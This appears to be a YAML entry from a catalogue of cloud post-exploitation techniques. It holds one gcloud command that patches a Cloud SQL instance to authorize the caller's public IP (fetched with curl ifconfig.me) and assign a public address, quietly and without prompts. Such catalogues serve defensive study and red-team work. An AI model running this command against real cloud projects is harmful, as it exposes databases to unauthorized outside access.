---
description: |
  Patches a GCP SQL instance to authorize a new network and assigns an IP.
command: |
  gcloud sql instances patch $INSTANCE_NAME --authorized-networks "$(curl ifconfig.me)" --assign-ip --quiet
items:
  - Access Keys
services:
  - gcp
OS:
  - Internal
attack_types:
  - PostExp
references:
  - https://cloud.google.com/sdk/gcloud/reference/sql/instances/patch
---
